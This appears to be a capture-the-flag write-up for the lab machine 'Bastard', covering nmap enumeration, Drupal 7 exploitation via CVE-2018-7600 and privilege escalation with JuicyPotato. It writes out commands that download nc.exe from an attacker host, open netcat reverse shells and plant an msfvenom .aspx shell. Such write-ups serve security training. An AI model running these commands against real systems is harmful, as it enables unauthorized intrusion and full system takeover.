# Bastard
> Silver Garcia

## Enumeration
Nmap
```bash
└──╼ [★]$ sudo nmap -T4 -A -p- 10.10.10.9
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-18 16:46 BST
Nmap scan report for 10.10.10.9
Host is up (0.0060s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   8.06 ms 10.10.14.1
2   7.71 ms 10.10.10.9
```

Found that http service is using Drupal 7.0

## Getting access
Got access to machine using `CVE-2018-7600` RCE exploit. (https://github.com/pimps/CVE-2018-7600)

1. Execute command to download nc.exe
```bash
python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe"
```
2. Set listener and execute command to get reverse shell
```bash
python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "nc.exe -e cmd.exe 10.10.14.5 4040"
```

## Privilege escalation

Got IIS privileges by placing `.aspx` reverse shell on `C:\inetpub\drupal-7.54\`.
1. place `.aspx` msfvenom reverse shell file on drupal-7.54 folder.
2. Set listener
3. Visit `http://10.10.9/shelliis.aspx`
4. Got IIS shell

Got `SeImpersonatePrivileges` with IIS user.

Got system privileges with JuicyPotato.exe
```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe 10.10.14.5 4545" -t *
```
